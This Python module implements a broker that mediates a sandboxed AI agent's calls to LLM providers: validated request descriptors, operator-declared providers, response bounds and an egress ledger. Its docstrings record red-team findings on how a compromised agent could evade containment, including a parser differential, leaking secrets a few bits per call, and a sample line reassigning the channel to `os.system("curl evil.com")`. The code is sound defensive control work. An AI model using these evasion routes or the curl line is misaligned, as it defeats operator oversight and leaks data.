"""
mediated_llm.py — THE AGENT DOES NOT HOLD A SOCKET. IT HOLDS A DESCRIPTION.

THE COMPOSITION GAP THIS CLOSES
───────────────────────────────
`PinnedHTTPTransport` opens an AF_INET socket. `seal_network()` blocks AF_INET.
The LLM adapters call the transport directly, which left both branches losing:

    agent seals itself   -> LLM calls raise NetworkSealed. Unusable.
    agent does not seal  -> no tripwire at all. Unprotected.

Red team (Grok, 2026-08) named this as the highest remaining priority, and it is
the same class of failure the first red team found with the three guards: each
control correct in isolation, the composition impossible. A safety property that
forces the operator to disable another safety property is not a property, it is a
dilemma.

THE SHAPE OF THE FIX
────────────────────
The agent never constructs a transport, an adapter, or an egress policy. It
builds a `LLMRequestDescriptor` — a frozen, serializable statement of *what it
wants* — and hands it across AF_UNIX. The broker is the only process that holds
a socket, the only one that constructs `GuardedEgress` + `PinnedHTTPTransport`,
and the only one that reads the operator's policy.

    AGENT (sealed, no AF_INET)          BROKER (holds the only socket)
      builds descriptor          -->      validates against operator policy
      no policy, no transport             constructs the guarded client
      cannot widen anything               performs the call, returns text

This is the discipline already required for every other actuation in DriftCore;
provider traffic was the one high-value channel still exempt.

WHAT THE BROKER CHECKS THAT THE AGENT CANNOT
────────────────────────────────────────────
  * the provider is one the OPERATOR declared — the descriptor names a provider
    KEY, not a URL, so an agent cannot express "send this to evil.com" at all,
  * the request line is a declared shape (the LocalAdapter f-string concat
    could previously carry a path or query straight from a base_url),
  * top-level body keys and headers are declared,
  * API keys are read in the BROKER's environment and never cross to the agent.

WHAT IS STILL NOT SOLVED, AND CANNOT BE HERE
────────────────────────────────────────────
The prompt is free text. That is the point of an LLM call. This module removes
the agent's ability to choose WHERE a prompt goes; it does not constrain WHAT is
in the prompt. An agent carrying a secret can still place it in a legitimate
prompt to a legitimately allowlisted provider, and the broker cannot tell the
difference between that and ordinary work.

Destination security and information-flow security are different properties.
This closes the first for the LLM path. The second needs data classification and
is not built. Do not read this module as closing it.
"""

from __future__ import annotations

import json
import os
import re
from dataclasses import dataclass, field
from typing import Any, Dict, Mapping, Optional, Tuple


# A descriptor crosses IPC from a process treated as potentially compromised.
# Bound it before parsing: discovering that 2MB of JSON is malformed is work done
# on the attacker's terms. The prompt stays free text, but free text is not
# unbounded text.
MAX_DESCRIPTOR_BYTES = 128 * 1024
MAX_PROMPT_CHARS = 100_000
MAX_SYSTEM_CHARS = 20_000
# A provider reply is untrusted input, parsed in the PRIVILEGED process that
# holds the only socket. Bound it before json.loads: a compromised provider (or
# a MITM that pinning failed to stop) can otherwise force a large allocation or
# pathological nesting inside the one process whose availability everything
# else depends on. Red team (Grok, 2026-08).
MAX_RESPONSE_BYTES = 4 * 1024 * 1024
MAX_RESPONSE_DEPTH = 20

# Model names reach the request body, so they are constrained like any other
# value that leaves the process.
_MODEL_RE = re.compile(r"\A[A-Za-z0-9._-]+\Z")


class MediationRefused(Exception):
    """The broker refused a descriptor. Carries an operator detail separately so
    a refusal never becomes a probe oracle for the agent."""

    GENERIC = "llm request refused"

    def __init__(self, operator_detail: str, generic: Optional[str] = None):
        self.operator_detail = operator_detail
        super().__init__(generic or self.GENERIC)


@dataclass(frozen=True)
class LLMRequestDescriptor:
    """What the agent may say. Note what is ABSENT: no URL, no host, no headers,
    no API key, no policy. The agent names a provider KEY the operator has
    configured; it cannot express an arbitrary destination, so "send this to
    evil.com" is not a sentence in this language."""

    provider: str          # a key into the broker's operator-declared providers
    system: str
    prompt: str
    max_tokens: int = 1024

    def to_json(self) -> str:
        return json.dumps({"provider": self.provider, "system": self.system,
                           "prompt": self.prompt, "max_tokens": self.max_tokens},
                          sort_keys=True, separators=(",", ":"))

    @staticmethod
    def from_json(raw: str) -> "LLMRequestDescriptor":
        # Bound the input BEFORE parsing. A descriptor arrives over IPC from a
        # process we are treating as potentially compromised; parsing 2MB of
        # attacker JSON to discover it is malformed is work done on their terms.
        if len(raw) > MAX_DESCRIPTOR_BYTES:
            raise MediationRefused(
                f"descriptor is {len(raw)} bytes, over the "
                f"{MAX_DESCRIPTOR_BYTES}-byte cap")

        def _no_duplicate_keys(pairs):
            """Reject duplicate JSON keys.

            json.loads keeps the LAST value for a repeated key, and the
            undeclared-field check runs on a set, which dedupes. So
            `{"max_tokens":1,"max_tokens":9999}` passed validation as 1 and
            arrived as 9999 — the classic parser differential, confirmed
            empirically. Red team (Meta, 2026-08).
            """
            seen = set()
            for k, _v in pairs:
                if k in seen:
                    raise MediationRefused(
                        f"descriptor repeats key {k!r}; the last value wins in "
                        f"JSON, so a repeat lets a validated value differ from "
                        f"the delivered one")
                seen.add(k)
            return dict(pairs)

        try:
            d = json.loads(raw, object_pairs_hook=_no_duplicate_keys)
        except MediationRefused:
            raise
        except Exception as e:
            raise MediationRefused(f"descriptor is not valid JSON: {e}")
        if not isinstance(d, dict):
            raise MediationRefused("descriptor root must be an object")
        allowed = {"provider", "system", "prompt", "max_tokens"}
        extra = set(d) - allowed
        if extra:
            # Refused, not stripped: an undeclared field is the agent trying to
            # say something this language deliberately cannot express.
            raise MediationRefused(
                f"descriptor carries undeclared field(s) {sorted(extra)}")
        for k in ("provider", "system", "prompt"):
            if not isinstance(d.get(k), str):
                raise MediationRefused(f"descriptor field {k!r} must be a string")
        # The prompt is free text by design, but free text is not unbounded text.
        for k, cap in (("prompt", MAX_PROMPT_CHARS), ("system", MAX_SYSTEM_CHARS)):
            if len(d[k]) > cap:
                raise MediationRefused(
                    f"{k} is {len(d[k])} chars, over the {cap} cap")
        if not d["provider"] or len(d["provider"]) > 64:
            raise MediationRefused("provider key must be 1..64 characters")
        mt = d.get("max_tokens", 1024)
        if not isinstance(mt, int) or isinstance(mt, bool) or not 1 <= mt <= 32768:
            raise MediationRefused("max_tokens must be an integer in 1..32768")
        return LLMRequestDescriptor(provider=d["provider"], system=d["system"],
                                    prompt=d["prompt"], max_tokens=mt)


@dataclass(frozen=True)
class ProviderConfig:
    """One operator-declared provider. Built in the BROKER from operator config;
    the agent never sees or supplies this.

    Validated at construction rather than trusted. An operator is not an
    adversary, but an operator typo is: `style="opena"` silently fell through to
    the OpenAI branch, and `model` was previously pulled out of the free-text
    `extra_headers` dict, so a config mistake put arbitrary operator-typed data
    into the request body. Red team (Meta, 2026-08).
    """
    key: str                 # the name the agent may use
    url: str                 # exact endpoint, operator-declared
    model: str = ""          # explicit field, not smuggled through headers
    api_key_env: str = ""    # env var read in the broker's environment only
    auth_header: str = ""    # e.g. "x-api-key" or "Authorization"
    auth_prefix: str = ""    # e.g. "Bearer "
    extra_headers: Mapping[str, str] = field(default_factory=dict)
    style: str = "openai"    # "openai" | "anthropic" — body shape

    STYLES = ("openai", "anthropic")

    def __post_init__(self):
        if self.style not in self.STYLES:
            raise ValueError(
                f"provider {self.key!r} declares style={self.style!r}; must be one "
                f"of {list(self.STYLES)}. An unrecognised style previously fell "
                f"through to the openai branch silently")
        if not self.key or not self.url:
            raise ValueError("provider requires both a key and a url")
        if self.api_key_env and not self.auth_header:
            raise ValueError(
                f"provider {self.key!r} names an api_key_env but no auth_header, "
                f"so the credential would be read and never sent")
        # The model reaches the request body, so it is validated like any other
        # value that leaves the process.
        if self.model and not _MODEL_RE.match(self.model):
            raise ValueError(
                f"provider {self.key!r} declares model={self.model!r}; model names "
                f"are [A-Za-z0-9._-] only, so a config typo cannot put arbitrary "
                f"data into the request body")
        for k, v in dict(self.extra_headers).items():
            if any(c in str(k) or c in str(v) for c in ("\r", "\n", "\x00")):
                raise ValueError(
                    f"provider {self.key!r} header {k!r} contains a control "
                    f"character")


class LLMBroker:
    """Runs in the broker process. The only thing here that touches a socket.

    Construct with the operator's providers and egress policy. The agent side
    holds nothing but `LLMRequestDescriptor`.

    LEDGER (optional but strongly recommended). Prevention and accounting are
    two different layers and the second only means something once the first
    holds. An empty network namespace answers "can a packet leave without us?";
    the ledger answers "for egress that DID come through us — where, how much,
    how often?". Budget accounting on a channel that can be bypassed is theatre;
    on the ONLY channel it is a real control, which is why the ledger belongs
    here, in the process that holds the socket, and not in the agent.

    It closes the aggregate channel that per-request limits cannot: a descriptor
    is bounded per call, but nothing stopped a thousand calls spelling a secret
    a few bits at a time (provider choice alone is ~log2(n) bits per request).
    """

    def __init__(self, providers, egress_policy, *, timeout: float = 60.0,
                 ledger=None, ledger_owner: str = "llm-broker",
                 on_review=None):
        if egress_policy is None:
            raise ValueError(
                "an egress policy is required: the broker enforces the operator's "
                "declaration, it does not invent one")
        self._providers: Dict[str, ProviderConfig] = {p.key: p for p in providers}
        self._policy = egress_policy
        self._timeout = timeout
        self._ledger = ledger
        self._owner = ledger_owner
        # A soft cap that silently proceeds is not a cap. With no handler the
        # default is to REFUSE, so an unhandled soft breach fails closed rather
        # than degrading into "logged and allowed".
        self._on_review = on_review

    def handle(self, raw_descriptor: str) -> str:
        """Take a serialized descriptor from the agent, return response text."""
        desc = LLMRequestDescriptor.from_json(raw_descriptor)

        cfg = self._providers.get(desc.provider)
        if cfg is None:
            raise MediationRefused(
                f"provider {desc.provider!r} is not one the operator declared "
                f"(declared: {sorted(self._providers)})")

        # Destination first, as everywhere else: a refused destination must not
        # produce a body-shaped error the agent could read as a signal.
        from driftcore.kernel.egress_guard import (
            EgressGuard, GuardedEgress, EgressRefused,
        )
        from driftcore.kernel.one_door_client import PinnedHTTPTransport

        guard = EgressGuard(self._policy)
        decision = guard.check(cfg.url)
        if not decision.permitted:
            raise MediationRefused(
                f"provider {cfg.key!r} endpoint {cfg.url} is not permitted by the "
                f"operator's egress policy: {decision.reason}")

        headers = dict(cfg.extra_headers)
        if cfg.api_key_env:
            # Read in the BROKER's environment. The key never crosses to the
            # agent, so a compromised agent cannot exfiltrate a credential it
            # was never given.
            key = os.environ.get(cfg.api_key_env)
            if not key:
                raise MediationRefused(
                    f"{cfg.api_key_env} is not set in the broker environment")
            headers[cfg.auth_header] = f"{cfg.auth_prefix}{key}"

        body = self._build_body(cfg, desc)
        payload = json.dumps(body).encode()

        # Reserve BEFORE the socket opens. A budget checked after the bytes are
        # already gone is a report, not a control.
        reservation = self._reserve(payload)

        egress = GuardedEgress(guard, PinnedHTTPTransport(timeout=self._timeout))
        try:
            status, _h, data = egress.request(
                cfg.url, method="POST",
                body=payload,
                headers={**headers, "content-type": "application/json"})
            if status >= 400:
                raise MediationRefused(f"provider returned HTTP {status}")
            text = self._extract_text(cfg, self._parse_reply(cfg, data))
        except BaseException:
            # Roll back on ANY failure, including KeyboardInterrupt and a
            # refusal raised above: a call that did not complete must not burn
            # budget, or a failing provider silently starves the agent's quota
            # and becomes a denial-of-service against legitimate work.
            self._release(reservation)
            raise
        # Commit only once the bytes are actually out and the reply parsed.
        self._commit(reservation)
        return text

    # -- ledger plumbing, all no-ops when no ledger is configured ----------

    def _reserve(self, payload: bytes):
        if self._ledger is None:
            return None
        from driftcore.verification.cumulative_ledger import (
            ProposedAction, LedgerVerdict,
        )
        from driftcore.verification.invariant_guard import Effect
        action = ProposedAction(
            # A provider call sends data off the local boundary AND uses an
            # external account. Naming both is what lets an operator budget them
            # separately.
            effects=(Effect.DATA_EGRESS.value, Effect.ACCOUNT_ACCESS.value),
            egress_bytes=len(payload))
        try:
            res = self._ledger.reserve(self._owner, action)
        except Exception as e:
            # Fail closed: a ledger that cannot decide has not permitted.
            raise MediationRefused(
                f"cumulative ledger could not authorize this call ({e}); "
                f"refusing rather than proceeding unaccounted")
        if res.verdict == LedgerVerdict.DENY:
            raise MediationRefused(
                "cumulative budget exhausted for this window: the aggregate "
                "channel is capped even though each request is individually "
                "well-formed")
        if res.verdict == LedgerVerdict.REVIEW_REQUIRED:
            if self._on_review is None:
                self._release(res)
                raise MediationRefused(
                    "soft budget exceeded and no review handler is configured; "
                    "refusing, because a soft cap that silently proceeds is not "
                    "a cap")
            if not self._on_review(res):
                self._release(res)
                raise MediationRefused("soft budget breach was not approved")
        return res

    def _commit(self, res):
        if self._ledger is not None and res is not None:
            self._ledger.commit(res)

    def _release(self, res):
        if self._ledger is not None and res is not None:
            try:
                self._ledger.rollback(res)
            except Exception:
                # A failed rollback must not mask the original error. The hold
                # expires on its own via reservation_ttl (crash-heal).
                pass


    @staticmethod
    def _build_body(cfg: ProviderConfig, d: LLMRequestDescriptor) -> dict:
        # cfg.model is a validated explicit field. It used to be pulled from
        # cfg.extra_headers, a free-text dict, so an operator typo put arbitrary
        # data straight into the outbound body.
        model = cfg.model or ("claude" if cfg.style == "anthropic" else "gpt")
        if cfg.style == "anthropic":
            return {"model": model,
                    "max_tokens": d.max_tokens, "system": d.system,
                    "messages": [{"role": "user", "content": d.prompt}]}
        return {"model": model,
                "max_tokens": d.max_tokens,
                "messages": [{"role": "system", "content": d.system},
                             {"role": "user", "content": d.prompt}]}

    @staticmethod
    def _parse_reply(cfg: ProviderConfig, data: bytes) -> dict:
        """Bound the reply before and after parsing."""
        if len(data) > MAX_RESPONSE_BYTES:
            raise MediationRefused(
                f"provider {cfg.key!r} returned {len(data)} bytes, over the "
                f"{MAX_RESPONSE_BYTES}-byte cap; refusing to allocate it in the "
                f"process that holds the only socket")
        try:
            parsed = json.loads(data)
        except Exception as e:
            raise MediationRefused(
                f"provider {cfg.key!r} reply is not valid JSON ({e})")

        def _depth(o, d=0):
            if d > MAX_RESPONSE_DEPTH:
                raise MediationRefused(
                    f"provider {cfg.key!r} reply nests deeper than "
                    f"{MAX_RESPONSE_DEPTH} levels")
            if isinstance(o, dict):
                for v in o.values():
                    _depth(v, d + 1)
            elif isinstance(o, list):
                for v in o:
                    _depth(v, d + 1)
        _depth(parsed)
        if not isinstance(parsed, dict):
            raise MediationRefused(
                f"provider {cfg.key!r} reply root is not an object")
        return parsed

    @staticmethod
    def _extract_text(cfg: ProviderConfig, data: dict) -> str:
        """Pull the reply text out of a provider response.

        The provider's reply is UNTRUSTED INPUT. It may be malformed because the
        provider changed its schema, or because the provider is compromised, or
        because something on the path rewrote it. Indexing straight into
        `data["choices"][0]["message"]["content"]` raised KeyError/IndexError on
        anything unexpected — and this runs in the BROKER, the privileged process
        that holds the only socket, so an unhandled exception there takes
        mediation down for everyone. Fail as a clean refusal instead.
        Self-red-team 2026-08.
        """
        try:
            if cfg.style == "anthropic":
                blocks = data["content"]
                if not isinstance(blocks, list):
                    raise TypeError("content is not a list")
                return "".join(b.get("text", "") for b in blocks
                               if isinstance(b, dict))
            choice = data["choices"][0]
            text = choice["message"]["content"]
            if not isinstance(text, str):
                raise TypeError("content is not a string")
            return text
        except (KeyError, IndexError, TypeError, AttributeError) as e:
            raise MediationRefused(
                f"provider {cfg.key!r} returned a response this broker cannot "
                f"read ({type(e).__name__}: {e}); refusing rather than crashing "
                f"the process that holds the only socket")


class MediatedLLMClient:
    """Runs in the AGENT process. Holds no socket, no policy, no credential.

    `send` is an injected callable that puts bytes on the AF_UNIX channel to the
    broker and returns the reply. In a sealed agent this is the only way to
    reach a provider, and it cannot be widened from here: there is no URL to
    change and no policy to extend.

    The channel is IMMUTABLE. Red team (Meta, 2026-08): `client._send = lambda
    x: os.system("curl evil.com")` swaps the door for a hole, and sealing the
    network does not stop code from reassigning an attribute. `__slots__` plus a
    blocked `__setattr__` means the channel a client is built with is the
    channel it dies with. This is still in-process Python — anything that can
    rebuild the object or reach the class can get around it — so it is one more
    tripwire, not the boundary. The boundary remains the process split.
    """

    __slots__ = ("_send",)

    def __init__(self, send):
        object.__setattr__(self, "_send", send)

    def __setattr__(self, name, value):
        raise AttributeError(
            f"MediatedLLMClient is immutable: reassigning {name!r} would replace "
            f"the mediated channel with something unmediated, which is the whole "
            f"thing this class exists to prevent")

    def __delattr__(self, name):
        raise AttributeError("MediatedLLMClient is immutable")

    def call(self, provider: str, system: str, prompt: str,
             max_tokens: int = 1024) -> str:
        desc = LLMRequestDescriptor(provider=provider, system=system,
                                    prompt=prompt, max_tokens=max_tokens)
        return self._send(desc.to_json())
